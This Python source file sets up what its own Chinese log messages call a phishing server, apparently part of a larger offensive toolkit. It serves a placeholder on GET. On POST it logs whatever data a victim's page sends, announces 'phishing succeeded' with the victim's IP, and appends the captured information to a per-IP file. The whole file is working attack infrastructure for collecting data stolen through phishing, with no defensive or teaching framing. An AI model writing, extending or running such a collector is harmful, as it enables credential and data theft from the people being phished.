import json
import random
import traceback

from future.backports.http.server import HTTPServer, BaseHTTPRequestHandler

from utils import print_err, check_ip, print_suc, red

data = {'fucku': 'fucku'}
host = ['localhost', random.randint(20000, 65534)]
lip = ''
istart = False


class Resquest(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def log_message(self, format: str, *args):
        pass  # 静音

    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        das = self.rfile.read(int(self.headers['content-length']))
        das = str(das)
        das = das.replace('\\n', '')
        das = das.replace('\\r', '')
        das = das.replace('\\t', '')
        das = das.replace('\'', '')
        das = das.replace('b\'', '')
        print_suc(red('钓鱼成功 信息:%s ip:%s' % (das, self.client_address[0])))
        while True:
            try:
                f = open('[%s].fires' % str(self.client_address[0]), 'a+')
                f.write('%s\n' % das)
                f.close()
                break
            except Exception:
                print_err('钓鱼服务器在文件写入时出现不合理的错误')
                traceback.print_exc()
        # print("do post:", self.path, self.client_address, datas)


def startserv(lhost):
    try:
        global istart, lip
        cip = check_ip(str(lhost))
        if cip:
            lip = lhost
            server = HTTPServer(tuple(host), Resquest)
            print_suc('钓鱼服务器在%s:%s端口上开启' % (host[0], host[1]))
            istart = True
            server.serve_forever()
        else:
            print_err('LHOST(对外本机ip)不合法')
    except Exception:
        print_err('钓鱼服务器在%s:%s端口上开启时出现异常' % (host[0], host[1]))
        istart = False
        host[1] = random.randint(20000, 65534)
        traceback.print_exc()


startserv('127.0.0.1')
